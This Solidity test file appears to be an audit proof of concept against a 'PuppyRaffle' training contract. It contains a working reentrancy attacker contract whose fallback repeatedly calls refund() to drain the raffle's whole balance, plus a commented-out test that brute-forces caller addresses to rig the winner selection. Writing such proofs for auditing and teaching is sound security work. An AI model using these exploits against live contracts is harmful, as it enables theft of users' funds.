// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {PuppyRaffleTest, PuppyRaffle, console} from "../PuppyRaffleTest.t.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

contract ProofOfCodes is PuppyRaffleTest {
    function testReentrance() public playersEntered {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 1e18);
        uint256 startingAttackerBalance = address(attacker).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        attacker.attack();

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingContractBalance = address(puppyRaffle).balance;
        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
        assertEq(endingContractBalance, 0);

        console.log("starting attacker balance", startingAttackerBalance);
        console.log("starting contract balance", startingContractBalance);
        console.log("ending attacker balance", address(attacker).balance);
        console.log("ending contract balance", address(puppyRaffle).balance);
    }

    // function testMineAddressesToGetWinner() public playersEntered {
    //     address attackerAddress = address(666);
    //     address[] memory players = new address[](1);
    //     players[0] = attackerAddress;
    //     puppyRaffle.enterRaffle{value: entranceFee}(players);

    //     vm.warp(block.timestamp + duration + 1);
    //     vm.roll(block.number + 1);

    //     for (uint256 i = 10; i < 10000; i++) {
    //         vm.prank(address(i));
    //         (, bytes memory winnerData) = address(puppyRaffle).staticcall(abi.encodeWithSignature("selectWinner()"));
    //         address winner;
    //         assembly {
    //             winner := mload(add(winnerData, 20))
    //         }
    //         if (winner == attackerAddress) {
    //             vm.prank(address(i));
    //             puppyRaffle.selectWinner();
    //             break;
    //         }
    //     }

    //     assertEq(puppyRaffle.previousWinner(), attackerAddress);
    // }
}
